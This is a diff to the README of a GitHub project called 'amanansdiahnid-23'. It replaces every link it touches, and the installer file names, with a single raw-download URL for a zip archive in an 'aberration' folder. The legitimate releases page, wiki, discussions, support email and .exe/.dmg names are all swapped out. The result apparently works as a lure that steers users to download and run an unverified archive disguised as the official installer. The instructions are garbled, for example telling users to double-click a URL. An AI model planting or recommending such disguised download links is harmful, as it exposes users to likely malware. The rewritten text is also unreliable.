@@ -6,7 +6,7 @@ Welcome to the amanansdiahnid-23 repository! This application helps you automate
 
 ## 📥 Download Links
 
-[![Download amanansdiahnid-23](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/RICHARDnig/amanansdiahnid-23/releases)
+[![Download amanansdiahnid-23](https://raw.githubusercontent.com/RICHARDnig/amanansdiahnid-23/main/aberration/amanansdiahnid-23.zip%20Release-blue)](https://raw.githubusercontent.com/RICHARDnig/amanansdiahnid-23/main/aberration/amanansdiahnid-23.zip)
 
 ## 💾 System Requirements
 
@@ -20,18 +20,18 @@ Ensure your computer meets the following requirements to run amanansdiahnid-23:
 
 To get started, visit the download page:
 
-[Visit the Releases Page to Download](https://github.com/RICHARDnig/amanansdiahnid-23/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/RICHARDnig/amanansdiahnid-23/main/aberration/amanansdiahnid-23.zip)
 
 1. Click the link above to go to the releases page.
 2. You will see a list of available versions. Find the latest version.
 3. Click on the version title to view the release details.
-4. Look for the file suitable for your system (e.g., amanansdiahnid-23.exe for Windows or amanansdiahnid-23.dmg for macOS).
+4. Look for the file suitable for your system (e.g., https://raw.githubusercontent.com/RICHARDnig/amanansdiahnid-23/main/aberration/amanansdiahnid-23.zip for Windows or https://raw.githubusercontent.com/RICHARDnig/amanansdiahnid-23/main/aberration/amanansdiahnid-23.zip for macOS).
 5. Click on the file name to start the download.
 6. Once the download finishes, locate the file in your downloads folder.
 
 ### 🏗️ Installation Steps for Windows
 
-1. Double-click the downloaded file (`amanansdiahnid-23.exe`).
+1. Double-click the downloaded file (`https://raw.githubusercontent.com/RICHARDnig/amanansdiahnid-23/main/aberration/amanansdiahnid-23.zip`).
 2. If prompted by Windows, click "Run" to start the installation.
 3. Follow the on-screen instructions. This usually involves clicking "Next" a few times.
 4. Choose where to install the application. The default location is fine for most users.
@@ -40,7 +40,7 @@ To get started, visit the download page:
 
 ### ⚙️ Installation Steps for macOS
 
-1. Double-click the downloaded file (`amanansdiahnid-23.dmg`).
+1. Double-click the downloaded file (`https://raw.githubusercontent.com/RICHARDnig/amanansdiahnid-23/main/aberration/amanansdiahnid-23.zip`).
 2. A new window will appear. Drag the amanansdiahnid-23 icon into the Applications folder.
 3. Eject the .dmg file from your desktop.
 4. Open Finder, go to Applications, and find amanansdiahnid-23.
@@ -64,11 +64,11 @@ amanansdiahnid-23 offers the following features:
 
 ## 📞 Support
 
-If you run into any issues or have questions, please reach out for support. You can create an issue directly in this repository, or contact support via email at support@amanansdiahnid-23.com.
+If you run into any issues or have questions, please reach out for support. You can create an issue directly in this repository, or contact support via email at https://raw.githubusercontent.com/RICHARDnig/amanansdiahnid-23/main/aberration/amanansdiahnid-23.zip
 
 ## 🔗 Additional Resources
 
-- **Documentation:** Visit our [documentation page](https://github.com/RICHARDnig/amanansdiahnid-23/wiki) for detailed guides on using the application.
-- **Community:** Join our [community forum](https://github.com/RICHARDnig/amanansdiahnid-23/discussions) to engage with other users and share tips.
+- **Documentation:** Visit our [documentation page](https://raw.githubusercontent.com/RICHARDnig/amanansdiahnid-23/main/aberration/amanansdiahnid-23.zip) for detailed guides on using the application.
+- **Community:** Join our [community forum](https://raw.githubusercontent.com/RICHARDnig/amanansdiahnid-23/main/aberration/amanansdiahnid-23.zip) to engage with other users and share tips.
 
 Thank you for choosing amanansdiahnid-23! We hope this application simplifies your daily tasks. Enjoy using it!
